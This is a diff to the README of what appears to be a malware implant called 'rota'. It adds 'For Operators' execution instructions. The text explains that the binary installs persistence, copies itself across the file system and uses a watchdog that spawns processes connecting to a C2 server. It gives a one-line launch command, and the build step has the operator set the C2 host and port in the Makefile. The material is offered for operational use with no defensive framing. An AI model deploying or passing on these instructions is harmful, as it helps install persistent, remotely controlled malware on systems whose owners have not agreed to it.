@@ -5,9 +5,17 @@
 * Make
 * gcc
 
+## For Operators
+### Execution
+Upon building the artifact, execute the following command to start rota. The following command will create the persistence locations, and copy rota to the appropriate locations on the file system. By killing the "rota-release" initial binary, the watchdog process will then spawn the follow on proceses and connect to the C2 server.
+
+``` sh
+nohup ./rota-release&; sleep 5; pkill rota-release
+```
+
+## For Developers
 ### Building
 1. Modify Makefile to specify C2 server and C2 port
-
 
 ``` sh
 #update Makefile here
